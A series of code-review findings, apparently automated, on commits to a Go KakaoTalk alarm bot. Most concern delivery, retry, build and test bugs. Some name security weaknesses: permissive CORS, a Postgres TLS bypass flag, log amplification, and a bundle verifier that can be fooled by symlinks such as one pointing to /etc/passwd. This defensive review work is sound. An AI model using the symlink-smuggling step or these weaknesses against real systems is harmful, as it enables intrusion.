description: The new code records a stable inbound identity from MessageID, ChatLogID, or SourceLogID, but commandReplyIdentity() prefers the threadID whenever one is present. commandReplyClientRequestIDBase() then hashes only room, that selected identity, and the outgoing message to form the ClientRequestID base. Since threadId is a thread/context identifier rather than necessarily a unique message identifier, two distinct inbound commands in the same room/thread that generate identical output will produce the same ClientRequestID with the same ':a1' attempt suffix. If Iris uses ClientRequestID for idempotency, the later reply can be treated as a duplicate of the earlier one, suppressing command responses or mixing status tracking. This is especially visible for deterministic responses such as help, usage, status, or common error messages. The fix should prefer the unique inbound message identity when present, or include both inbound message identity and thread ID in the hash, while keeping threadID only as a reply-routing option.

title: Kakao test room IDs disclosed in contract docs
description: The new Karing KakaoLink contract documentation includes explicit `receiver_room_id` values for the primary smoke-test room and an additional operator-approved room, plus the primary room name. Room/chat identifiers are sensitive operational metadata in this project because they identify concrete KakaoTalk targets used by the bot. On their own these values do not grant access, but if an attacker later obtains an API key, reaches an Iris/Karing endpoint, or exploits a send/auth weakness, the committed IDs provide ready-made targets for unauthorized messages, spam, or probing. These IDs should be removed from committed docs and supplied through private runbooks, secrets, or environment-specific test configuration.

title: Karing dispatch rejects milestone outbox alarms
description: The commit adds an opt-in Karing dispatch path controlled by ALARM_DISPATCH_KARING_ENABLED. Once enabled, every alarm dispatch group is sent through dispatchKaringContentListGroup. For YouTube outbox payloads, the new Karing item builder only handles NEW_VIDEO, NEW_SHORT, LIVE_STREAM, and COMMUNITY_POST. The repository already defines and formats OutboxKindMilestone, but the new switch falls through to an unsupported-kind error for MILESTONE. That error is treated as a pre-send failure, so milestone alarms will be retried and eventually moved to DLQ rather than delivered whenever the Karing path is enabled.

title: Unbounded YouTube outbox identity can block dispatch
description: Canonical YouTube outbox payloads validate only that each item has a non-empty ContentID and Payload. The identity is then produced by sorting ContentIDs and joining them with a comma, with no length limit, escaping, or hashing. That identity is used directly in the PostgreSQL alarm dispatch event key, but the existing schema enforces event_key length <= 512. A canonical payload containing many items or long ContentIDs can therefore make PublishDispatchBatch fail during outbox insertion and prevent dispatch of the whole batch. The same comma-delimited identity is also ambiguous: different item sets such as ["a,b", "c"] and ["a", "b,c"] produce the same identity. In the Valkey dispatcher path, colliding YouTube outbox group keys are rendered from only the first envelope, so another colliding notification can be marked dispatched without its content being sent. This is primarily an availability/integrity issue for notifications if an untrusted upstream or queue producer can influence canonical YouTube outbox payloads.

title: Channel health cooldowns disabled by default
description: Before this change, recorded parser-drift, timeout, transport, or HTTP-status failures caused ChannelHealthStore.ShouldSkip to suppress future requests for that channel/source until NextAllowedAt. The commit adds an Enforce flag and sets its default to false in both the scraper config and the underlying policy. Since loadScraperChannelHealthConfig uses that default unless SCRAPER_CHANNEL_HEALTH_ENFORCE=true is explicitly set, the normal loaded configuration has ChannelHealth.Enabled=true but Enforce=false. buildSharedYouTubeScraperClient then passes this false flag into the scraper client, and ShouldSkip returns false before checking persisted cooldown state. As a result, untrusted upstream responses or a monitored channel/source that repeatedly triggers parser drift or transient fetch failures can be polled every scheduled cycle instead of being suppressed by the channel-source cooldown, increasing request volume and rate-limit pressure and potentially degrading notification ingestion availability.

title: Admin API CORS defaults to allow any origin
description: The new CORS code treats non-enforcing mode as allow-all: the CORS middleware accepts every Origin and the origin guard only logs before allowing the request. The shared config loads CORS_ENFORCE with a default of false, and production validation only requires explicit origins when CORS_ENFORCE=true. As a result, a default production deployment now sends permissive CORS responses with credentials enabled instead of enforcing the configured origin allowlist. This weakens the browser trust boundary for the admin API and can let a malicious web page use an operator's browser as a network pivot to read responses from the loopback/internal admin API or perform cross-origin requests where bearer credentials are available to the browser client.

title: Production SSL enforcement bypass via POSTGRES_SSLMODE_ALLOW_INSECURE
description: In production, validatePostgresSSLMode now returns success whenever POSTGRES_SSLMODE_ALLOW_INSECURE is true. This bypasses the previous enforcement that rejected sslmode=disable/allow/prefer. If this flag is enabled (as the commit message indicates for live deployments), database traffic can be sent without TLS, exposing credentials and data to interception or tampering on the internal network. The change weakens a security control intended to prevent insecure transport in production.

title: Startup error path leaks ingestion lease
description: After the ingestion lease is acquired, buildIngestionRuntime now calls buildIngestionRuntimeYouTubeDependencies and returns on error with only infra.cleanup(). The new helper propagates errors from buildStreamIngesterYouTubeComponents, including poller registration and YouTube scraper budget validation failures. Because the acquired providers.IngestionLease is not released on this startup-failure path, the distributed lock remains in Valkey until its TTL expires. This can temporarily block another stream-ingester/youtube-scraper instance or a quick restart from acquiring the lease. Similar post-lease cleanup gaps existed elsewhere, but this commit introduced a new post-lease return path by starting to propagate buildStreamIngesterYouTubeComponents errors.

title: Bundle verifier ignores symlinks and special entries
description: The verifier extracts the supplied archive and then builds ACTUAL_FILES with `find ... -type f`, so only regular files are checked against the expected export policy and excluded-path rules. Non-regular tar entries are never inspected. An attacker can take a valid bundle, add a symlink such as `.git -> /tmp` or `.vscode/settings.json -> /etc/passwd`, repack it, and the verifier still reports `OK: full bundle matches in-repo export policy` because the added symlink is not a regular file. This undermines the provenance check added by this commit and can smuggle excluded paths or dangerous archive entries into a bundle that downstream reviewers may later extract or process.

title: Remote build cache exports build-stage source layers
description: The added docker-compose.remote-cache.yml enables registry cache import/export for five production services and uses cache_to with mode=max. BuildKit registry caches in max mode include intermediate build-stage layers, not just final image layers. The referenced Dockerfiles copy the Go workspace, service source directories, shared code, and additional build contexts into the builder stage before compiling. As a result, using this override can upload those source trees and build-stage artifacts to ${REMOTE_CACHE_PREFIX}. If that registry/package is public or readable by unintended users, the cache becomes an information leak. The same mutable cache_from refs also need to be treated as trusted supply-chain input because a writer to the cache registry can provide cached RUN outputs, but the directly demonstrated issue here is exposure of intermediate source layers. The Docker context excludes .env-style files, so I did not find direct secret inclusion, but the change still broadens confidentiality exposure for source and private dependency code.

title: Grouped send failures drop whole delivery groups
description: The commit routes multi-item room/channel/kind batches through dispatchGroup. formatGroupedMessage builds one combined message, and grouped messages are padded and can become much larger than the old per-outbox messages. If Iris/Kakao rejects the grouped message because it is too large, malformed for the downstream service, or otherwise group-specific, the code records a send failure for every delivery row and never attempts the already available individual-dispatch fallback. Those rows will be retried in the same grouped form and can eventually be marked terminally failed, causing notification delivery loss for the affected room/channel/kind. This is an availability issue for notification delivery and is newly reachable because dispatchDeliveryRows now invokes dispatchGroup for grouped rows.

title: Production Postgres TLS enforcement can be bypassed
description: The commit adds a POSTGRES_SSLMODE_ALLOW_INSECURE override in validatePostgresSSLMode. When set, it returns success before rejecting insecure modes (disable/allow/prefer) in production, weakening the previous hard guarantee that production connections use TLS. If an operator (or attacker with privileged config access) enables this flag, database traffic can be downgraded to cleartext, enabling MITM/credential disclosure on the network path.

title: Unbounded forwarded-header logging can amplify logs
description: LoggerMiddleware now reads X-Forwarded-For and X-Real-IP directly from the request and appends them to structured request logs whenever they are non-empty. These headers are fully attacker-controlled unless a trusted reverse proxy strips or overwrites them, and the new code does not truncate or validate them. The middleware is installed globally before route authentication, and missing/invalid API keys or unknown routes produce 4xx responses, which are logged at WARN level even under the default info log level. With the server accepting up to 1 MiB of headers, an unauthenticated client can repeatedly send oversized forwarding headers to produce large stdout/file log records, causing log storage churn or disk pressure and polluting audit logs with spoofed source values. This does not bypass authentication, but it introduces an availability/audit-integrity risk in exposed deployments.

title: Invalid reflect.Value.Fields call breaks poller tests
description: The modified poller test helper previously iterated struct fields using NumField()/Field(i). The commit rewrites that loop to `for _, field := range value.Fields()`. `reflect.Value` does not provide a `Fields()` method in the Go toolchains available in this environment, so this package will not compile under `go test`. This is confined to a `*_test.go` file and does not alter production authentication, authorization, API, Docker, or webhook code, so it is not a runtime security vulnerability.

title: Runbook redeploy command omits required compose file
description: The commit adds documentation for redeploying the new main-host youtube-producer-c instance, but the command only sets COMPOSE_PROFILES=main-ap. The compose-redeploy-service.sh wrapper defaults COMPOSE_FILE to docker-compose.prod.yml and explicitly rejects youtube-producer-c unless COMPOSE_FILE also includes docker-compose.main-ap.yml. Operators following the new runbook would hit the guard error instead of redeploying youtube-producer-c. The intended command should include something like COMPOSE_FILE=docker-compose.prod.yml:docker-compose.main-ap.yml in addition to COMPOSE_PROFILES=main-ap.

title: Test-only cleanup helper breaks external tests
description: Before this commit, CleanupForTest was a normal method on Dispatcher in non-test code. The commit removed it from dispatcher.go and reintroduced it only in dispatcher_testhooks_test.go with package delivery. Go does not expose methods from a package's _test.go files to external test packages or to packages importing it through wrappers. dispatcher_integration_test.go is package delivery_test, imports the public outbox wrapper, creates an outbox.Dispatcher, and still calls dispatcher.CleanupForTest(ctx). Because the production method no longer exists on outbox.Dispatcher, this external test will fail to compile with an undefined method error.

title: Outbox ownership failures are ignored before sending alarms
description: The alarm dispatch runner uses MarkSending as the last ownership/status gate before it calls Iris/Kakao. Before this commit, MarkSending and MarkSent returned an error when RowsAffected was less than the requested IDs, so a worker whose lease expired, whose row was recovered, or whose row was otherwise no longer in the expected state would stop before sending or report the failed completion. This commit replaces that check with warnRowsAffected, which returns nil even for 0 rows out of many. As a result, dispatchMessageGroup and dispatchKaringContentListGroup proceed to external sends after a complete ownership mismatch. MarkSent also returns success after failing to mark sent, leaving the row eligible for recovery/quarantine/retry and causing duplicate or stale notifications. Partial batches may be legitimate, but ignoring a zero-row transition without filtering the envelopes to successfully transitioned rows breaks the outbox state machine.

title: Continuous observation report panics on nil wiring
description: The public continuous observation collection entry point now passes a partially initialized collectorWiring with only collectObservation, collectTargetBaseline, and buildChannelSummary populated. collectArtifacts then proceeds to collect send counts, delivery logs, latency cause, latency periods, and the alarm history dataset through wiring fields that remain nil. The first successful invocation that reaches send count collection will dereference wiring.collectSendCounts and panic instead of returning an error. This breaks the ops CLI continuous-observation-report command and can terminate the process.

title: Celebration keys collide for shared-channel members
description: Celebration dispatch/event identity omits a stable member identifier or member name. The commit's own seed data includes Fuwawa Abyssgard and Mococo Abyssgard with the same channel_id and the same debut_date. On their anniversary, the runner builds two distinct anniversary payloads with different MemberName values but identical celebration identities and event keys. In PG outbox mode this causes addPreparedEvent to detect the same event_key with different payload hashes and abort the whole PublishDispatchBatch for that run. In Valkey dispatch grouping, envelopes for the same room/kind/channel can also be grouped together and renderAlarmDispatchGroup renders only the first celebration envelope, dropping the other member's message if they are drained together.

title: Zero-value dispatcher process path can panic
description: After this refactor, processClaimedOrPendingDeliveries calls d.claim.processPendingDeliveries(ctx) directly when there are no newly claimed outbox rows. Calling a method with a nil pointer receiver is allowed in Go, but ClaimManager.processPendingDeliveries immediately dereferences d.delivery, so if d.claim is nil the process path panics. Previously, the deleted claimManager() wrapper synthesized a fallback ClaimManager when d.claim was nil, making this path a no-op. Normal production construction via NewDispatcher initializes d.claim, so there is no identified remote or security-relevant exploitation path; the impact is limited to misuse of the exported Dispatcher zero value or partial initialization, especially through the ProcessOnceForTest helper.

title: Architecture checks can skip configured shared-go path
description: The changed scripts now unconditionally choose either ${ROOT_DIR}/shared-go or ${ROOT_DIR}/../shared-go. This avoids the previous set -u crash when SHARED_GO_DIR was unset, but it also ignores an explicitly supplied SHARED_GO_DIR and does not validate that the chosen directory exists before running checks. In the route-hardcoding checks, missing shared-go errors are redirected or masked with `|| true`, so those checks can succeed while not inspecting shared-go at all. This is not a runtime vulnerability, but it weakens CI/developer architecture validation and can miss violations in the active shared-go workspace.

title: shared-go path refactor breaks Go builds and deploys
description: This appears to be an introduced operational/build bug rather than a security vulnerability. The workspace and module replace directives now point outside the repository to ../shared-go or ../../../shared-go. However, the Docker build setup still copies the shared_go_workspace additional context into /workspace/hololive-bot/shared-go, while the Go toolchain will resolve the workspace path as /workspace/shared-go. The youtube-producer Dockerfile also still expects a shared-go directory inside the main build context even though this commit deletes that directory from the repository. As a result, production rebuilds using these Dockerfiles are likely to fail because github.com/park285/shared-go cannot be found at the path required by go.work/go.mod.

title: Fast pre-push skips Go checks for embedded assets
description: This commit changes the default pre-push mode to `fast`, which maps `LOCAL_CI_GO_SCOPE` to `changed`. The changed-scope package selector only reacts to `*.go`, `go.mod`, `go.sum`, and workspace metadata files. Changes to other files under Go modules are ignored. The repository contains Go packages that depend on non-Go embedded assets such as JSON, templates, and fonts via `//go:embed`. If one of those assets is deleted, renamed, malformed, or otherwise changed in a way that should be caught by package build/tests, the default pre-push path can select zero Go packages and skip `go fix`, `go vet`, `staticcheck`, `go build`, and `go test`. This is not a runtime security boundary, but it weakens the local quality gate and can allow build-breaking or runtime-breaking changes to pass when the project relies on this pre-push gate instead of hosted CI.

title: Order-dependent health Init test
description: No production code or security-sensitive path is modified by this commit. However, the newly added TestInit_IdempotentViaSyncOnce assumes that Init has already been called by a previous test. If this test is run alone, or if test order is shuffled, first will be the default version value and Init("should-be-ignored") will mutate the package global state, causing the assertion to fail. This is a test reliability bug rather than a security vulnerability.

title: Karing 502/503 retry path fails for PG outbox
description: In `dispatchKaringContentListGroup`, the runner marks a dispatch group as `sending` before calling `SendKaringContentList`. The new `isAlarmDispatchRetryablePostSendFailure` branch then routes Karing 502/503 failures to `persistPreSendFailure`, which calls `ScheduleRetry`. For the production/default PG consumer, `ScheduleRetry` only updates rows whose status is `leased`; it will update zero rows after `MarkSending` changed them to `sending`, returning an ownership mismatch error. The fallback `Requeue` for the PG consumer is also `ScheduleRetry`, so it has the same mismatch. As a result, the intended retry is not persisted; the row remains in `sending` until stale-sending recovery quarantines it. This turns transient Karing 502/503 errors into stuck/quarantined deliveries instead of retries in the default prod configuration.

title: Karing 502 retry fails for PG sending rows
description: In Karing dispatch, the runner calls `MarkSending` before calling `SendKaringContentList`. In PG consumer mode, `MarkSending` changes `alarm_dispatch_deliveries.status` from `leased` to `sending`. The new retryable-post-send branch then calls `persistPreSendFailure`, which calls `ScheduleRetry`. However, the PG repository's `ScheduleRetry` query only updates rows where `status='leased'`, so it will affect zero rows for the already-`sending` deliveries and return an error. The fallback requeue path for the PG consumer also maps back to `ScheduleRetry`, so it cannot recover these rows either. As a result, the intended Karing 502/503 retry does not work in PG mode; the rows remain `sending` until stale-sending recovery quarantines them, causing dropped/quarantined notifications instead of retries.

title: Valkey alarm send failures now go straight to DLQ
description: For the default Valkey-backed alarm dispatch path, the commit sets postSendQuarantine to true. In alarmDispatchRunner.persistPostSendingFailure, that makes any send error after MarkSending call Consumer.Quarantine instead of the retry path. The Valkey Consumer.Quarantine implementation simply calls MoveToDLQ, so a temporary Iris/Karing outage, timeout, or 502/503 response can permanently drop alarm notifications into the dead-letter queue without retry attempts. This is especially problematic because the new Karing contract documentation says failed deliveries should remain retryable through the owning queue/outbox policy.

title: Member name fallback can drop valid alarm names
description: The new repository queries first choose the latest alarm row for a channel, then apply COALESCE/NULLIF with members.short_korean_name and members.korean_name. If the members table has no matching non-empty name and the latest alarm row has an empty or NULL member_name, the code returns an empty name or filters the channel out, even when an older alarm row for the same channel has a valid member_name. The previous queries explicitly selected the latest non-empty member_name from alarms. This can cause cache warming and GetMemberName callers to lose display names for channels with mixed historical alarm rows.

title: Chunked Karing sends mishandle partial failures
description: When a grouped alarm contains more than four Karing items, the new code builds multiple KaringContentList requests and sends them sequentially. However, all envelopes are marked as sending before the first request is sent, and if any later request fails, the runner calls persistPostSendingFailure with the entire original group. In the default PG consumer path this quarantines all rows, including items from later chunks that were never successfully sent. In Valkey/fallback mode it may retry the whole group, duplicating chunks that were already sent. This can cause lost notifications or duplicate spam for multi-chunk alarm groups, especially if Iris/Karing rejects one chunk or the worker fails mid-loop. I did not find an authentication bypass, secret exposure, injection, or direct security vulnerability introduced by this commit.

title: Chunked Karing sends mishandle partial failures
description: This commit changes Karing dispatch from one request per alarm group to multiple chunked requests of at most four items. However, dispatchKaringContentListGroup still marks the entire group as sending before the loop and, if any individual chunk send fails, calls persistPostSendingFailure with all group envelopes. In PostgreSQL mode with post-send quarantine enabled, a failure in an early chunk quarantines all envelopes, including later chunks that were never attempted, causing notification loss. In Valkey mode or when quarantine is unavailable, the same all-envelope retry path can resend chunks that already succeeded, causing duplicate notifications. The error handling needs to track which chunk/envelopes were sent, which failed, and which remain unsent instead of applying one group-wide post-send outcome after partial progress.

title: Docker builds still require removed Iris workspace
description: After this commit, the Go workspace no longer includes ../iris-client-go and the service modules now resolve github.com/park285/iris-client-go from the pinned pseudo-version. However, docker-compose.prod.yml, build-all.sh, and the Go service Dockerfiles still require an iris_client_go_workspace build context, defaulting to ../iris-client-go. In environments that only have this repository checked out, production Docker builds or build-all.sh will still fail before using the pinned module. This is an availability/deployment regression rather than a runtime security vulnerability.

title: Karing card URL may contain two concatenated links
description: When ALARM_DISPATCH_KARING_ENABLED is enabled, alarm notifications are sent as structured Karing content items. The item URL is populated with resolveAlarmDispatchURL(). For integrated streams, that resolver returns a text-oriented value like "<youtubeURL> | <chzzkURL>". This is appropriate for the old plain-text message body, but not for a structured URL field that downstream Karing/Iris/Kakao rendering is likely to treat as one clickable URL. The result can be malformed card links or delivery rejection for integrated streams. This appears to be an introduced functional reliability bug, not an authentication bypass or data compromise.

title: Latency can use a timestamp that is not stored
description: The commit changes tracking upserts to preserve an existing actual_published_at value with COALESCE(existing, excluded). However, UpsertBatch still builds finalActualPublishedExpr with the old semantics: use EXCLUDED.actual_published_at whenever it is non-null. That expression is then used to compute alarm_latency_millis and alarm_latency_exceeded during the same ON CONFLICT update. As a result, if a tracking row already has actual_published_at and alarm_sent_at, a later upsert with a different non-null actual_published_at will keep the original actual_published_at in the row but recompute latency fields using the new excluded timestamp. This creates internally inconsistent telemetry. I did not find an authentication, authorization, injection, info leak, crash, or other security-relevant vulnerability in the changed code.

title: Tracking latency uses non-persisted publish timestamp
description: In youtube_content_alarm_tracking upserts, the stored actual_published_at was changed to prefer the existing row value via COALESCE(youtube_content_alarm_tracking.actual_published_at, EXCLUDED.actual_published_at). However, the expression passed to buildLatencyMillisExpr was not updated and still treats EXCLUDED.actual_published_at as the final value whenever it is non-null. As a result, if a row already has an actual_published_at and a later upsert supplies a different non-null timestamp, the database row preserves the old actual_published_at but recomputes alarm_latency_millis and alarm_latency_exceeded using the new timestamp. This can corrupt delivery telemetry and latency classifications, but it does not expose secrets, bypass authentication, or grant unauthorized control.

title: Canonical YouTube payload kind/type mismatch accepted
description: The commit adds canonical YouTube outbox payloads, but validation only checks that Notification.AlarmType equals YouTubeOutbox.AlarmType. It does not verify that YouTubeOutbox.Kind maps to that same alarm type. As a result, an envelope such as Kind=COMMUNITY_POST with AlarmType=SHORTS is accepted. Rendering then uses Kind to format the message, while ledger/dedupe/telemetry store AlarmType, causing misclassified notifications and undermining alarm-type separation. This appears to be an introduced correctness/integrity bug rather than a directly exploitable security issue because the canonical dispatch publisher/queue is internal under the stated deployment model.

title: Tracked-artifact gate skips missing tracked files
description: The script enumerates tracked paths using `git ls-files`, then now skips any path that does not currently exist in the working tree. Because `git ls-files` reports index-tracked files, a forbidden tracked artifact such as `*.patch` or `*.diff` can be ignored if it is absent from the working tree, for example after an unstaged deletion or in some sparse-checkout scenarios. In a normal full CI checkout this does not allow a committed existing artifact to pass, and it does not affect deployed services, authentication, secrets handling, or runtime behavior.

title: Tracked artifact check can miss staged missing files
description: The check is intended to reject tracked local artifacts such as *.patch and *.diff files by iterating over git ls-files. The added `[[ ! -e ... ]]` guard skips any tracked/indexed path that is missing from the working tree before applying the artifact patterns. In a non-clean developer workspace, a staged artifact whose worktree copy was removed can pass this script even though the artifact remains in the index and can still be committed. This does not affect the runtime services and should still be caught by the GitHub Actions workflow's clean checkout, so the impact is limited to weakening local/pre-commit hygiene checks.

title: Version shortcut leaves YouTube notification targets stale
description: The commit adds an optimization in youTubePollTargetRefresher.refresh: when the alarm channel registry version is unchanged, it returns early instead of reading alarm:channel_registry. If the operational channel list changed, the early-return branch updates only StatsChannelIDs. NotificationChannelIDs are not recomputed against the new operational roster, even though normal target resolution filters alarm channels through the current operational channels. As a result, a channel that becomes non-operational can continue to be polled for notifications, and a channel that becomes operational while already subscribed may not be added, until the alarm registry version changes or the service restarts.

title: Shared H3 default can block non-H3 services
description: The new shared transport default is HOLOLIVE_HTTP_TRANSPORTS=h3, and an empty transport list is also treated as H3. validateServerTransports then requires HOLOLIVE_H3_ADDR, HOLOLIVE_H3_CERT_FILE, and HOLOLIVE_H3_KEY_FILE whenever H3 is considered enabled. This Config loader is reused by services such as hololive-admin-api, hololive-alarm-worker, and stream-ingester, but those runtimes still construct H2C HTTP servers and do not use the H3 certificate paths. As a result, deployments or local/CI invocations that previously relied on defaults and did not set H3 cert/key variables can fail at configuration validation even for services that never start an H3 listener.

title: Schedule-change claim keys are not released
description: The new notifier path appends schedule-change dedup keys to the same claim_keys list that is passed through the alarm queue. Those keys are built with prefixes such as `notified:schedule:transition:room:` and `notified:schedule:transition:event:`. However, the queue consumer's `ReleaseClaimKeys` function filters release candidates to only keys starting with `notified:claim:`. When the dispatcher exhausts retries and tries to release the envelope's claim keys, it will release the normal notification/logical claim keys but silently ignore the schedule-transition keys. Since those schedule-transition keys use the `NotificationSent` TTL, they can persist for 24 hours and cause later `TryClaimNotificationScheduleChange` calls for the same transition to return not-claimed, suppressing replacement schedule-change notifications after a delivery failure.

title: Alarm add/remove race can create ghost cache entries
description: With a repository configured, AddAlarm first checks the cache, then persists the DB record, and only afterwards writes the Valkey room/subscriber cache. RemoveAlarm checks existence from the repository, deletes the DB row, and then removes the cache. There is no per-room/channel lock or transaction spanning both stores. A concurrent interleaving can therefore produce divergence: AddAlarm observes an empty cache and persists the row; RemoveAlarm observes that row in DB, deletes it, and removes zero entries from the still-empty cache; then AddAlarm resumes and writes the alarm into Valkey. No cache mutation error occurs, so the rebuild path is not invoked. The final state is DB absent but cache present, causing notifications to continue until a later full cache rebuild/restart. The reverse stale-cache case can also cause AddAlarm to return false while the DB row is missing.

title: Partial alert failure can spam all healthy rooms
description: The new all-target success rule avoids marking a notification as sent after partial delivery, but the code does not record which rooms already received it. dispatchMilestoneAlerts sends each unnotified alert to every distinct alarm room. If any room fails, the notification is omitted from the batch passed to MarkMilestonesNotifiedBatch or MarkApproachingChatNotifiedBatch, so it remains globally unnotified. On the next milestone watcher tick, the same notification is sent again to all rooms, including the rooms that succeeded before. A stale or attacker-controlled alarm room that consistently fails delivery can therefore hold global notification state open and repeatedly spam every healthy subscribed room.

title: Local retry sequence can collapse retries across consumers
description: Valkey sorted sets use the member string as a unique key.
